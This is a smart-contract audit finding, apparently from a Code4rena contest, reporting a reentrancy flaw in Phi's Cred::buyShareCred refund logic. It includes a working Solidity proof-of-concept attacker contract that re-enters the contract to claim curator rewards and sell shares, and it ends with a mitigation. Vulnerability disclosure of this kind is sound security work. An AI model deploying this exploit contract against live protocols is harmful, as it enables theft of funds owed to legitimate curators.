# Vulnerability details

## Impact
The [`Cred::buyShareCred` function](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L178) allows for reentrancy attacks as the [refund payment](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L642) is made prior to modifying the `lastTradestamp` for the curator [here](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L644). This allows a malicious contract to do the following in a single transaction:

1. Take out a flash loan.
1. Use the borrowed funds to buy shares with `msg.value` greater than what is required.
1. The contract's fallback function will be triggered when the refund is processed. During the fallback, it can use the shares to claim rewards using `CuratorRewardsDistributor::distribute`.
1. Sell the shares that were bought previously.
1. Repay the flash loan.

This attack is only viable if the creator and protocol fees, as well as gas fees are not too high. However, if executed it steals the rewards owed to existing curators as their shares are diluted by the attacker.

## Proof of Concept

A POC of the attack is shown below. Please note - a flash loan is not used in this POC but it could be easily adapted to use one.

```solidity
import { PRBTest } from "@prb/test/src/PRBTest.sol";
import { Test } from "forge-std/Test.sol";

import { ECDSA } from "solady/utils/ECDSA.sol";
import { LibClone } from "solady/utils/LibClone.sol";

import { Cred } from "../src/Cred.sol";
import { ICred } from "../src/interfaces/ICred.sol";
import { ICuratorRewardsDistributor } from "../src/interfaces/ICuratorRewardsDistributor.sol";
import { IRewards } from "../src/interfaces/IRewards.sol";
import { BondingCurve } from "../src/curve/BondingCurve.sol";

contract TestCred is Settings {
    uint256 private constant GRACE_PERIOD = 14 days;
    uint256 private constant CLEARING_PERIOD = 30 days;
    string constant credUUID = "18cd3748-9a76-4a05-8c69-ba0b8c1a9d17";

    function _createCred(string memory credType, string memory verificationType, bytes32 merkleRoot) internal {
        vm.warp(START_TIME + 1);
        vm.startPrank(participant);
        uint256 credId = 1;
        uint256 supply = 0;
        uint256 amount = 1;
        uint256 expiresIn = START_TIME + 100;
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amount);
        string memory credURL = "test";
        bytes memory signCreateData = abi.encode(
            expiresIn, participant, 31_337, address(bondingCurve), credURL, credType, verificationType, merkleRoot
        );
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);

        cred.createCred{ value: buyPrice }(participant, signCreateData, abi.encodePacked(cr, cs), 100, 100);
        vm.stopPrank();
    }

    function test_attackCred() public {
        vm.warp(START_TIME + 1);

        _createCred("BASIC", "SIGNATURE", 0x0);
        uint256 rewardsAmount = 0.5 ether;
        curatorRewardsDistributor.deposit{value: rewardsAmount}(1, rewardsAmount);
        console2.log("Balance of cred ID: %s", curatorRewardsDistributor.balanceOf(1));

        address attackerWallet = makeAddr("attackerWallet");
        uint256 attackerInitialBalance = 10 ether;
        vm.deal(attackerWallet, attackerInitialBalance);
        vm.startPrank(attackerWallet);

        Attacker attacker = new Attacker(cred, curatorRewardsDistributor, phiRewards, attackerWallet, 1, 5);
        attacker.attack{value: attackerInitialBalance}();
        console2.log("Attacker balance increased by: %s", attackerWallet.balance - attackerInitialBalance);
    }
}

contract Attacker {
    ICred private immutable cred;
    ICuratorRewardsDistributor private immutable curatorRewardsDistributor;
    IRewards phiRewards;
    address private immutable destination;
    uint256 private immutable credId;
    uint256 private immutable amount;
    bool private reentered = false;

    constructor(
        ICred cred_,
        ICuratorRewardsDistributor curatorRewardsDistributor_,
        IRewards phiRewards_,
        address destination_,
        uint256 credId_,
        uint256 amount_
    ) {
        cred = cred_;
        curatorRewardsDistributor = curatorRewardsDistributor_;
        phiRewards = phiRewards_;
        destination = destination_;
        credId = credId_;
        amount = amount_;
    }

    function attack() external payable {
        uint256 buyPrice = cred.getCredBuyPriceWithFee(credId, amount);
        cred.buyShareCred{value: buyPrice + 1}(credId, amount, buyPrice);
    }

    receive() external payable {
        if (reentered) {
            return;   
        }
        reentered = true;
        curatorRewardsDistributor.distribute(credId);
        phiRewards.withdraw(destination, 0);
        cred.sellShareCred(credId, amount, 0);
        (bool succ,) = destination.call{value: address(this).balance}("");
        require(succ);
    }
}
```

## Recommended Mitigation Steps

The refund should be sent to the caller at the end of the `Cred::_handleTrade` function (after all state updates are made).
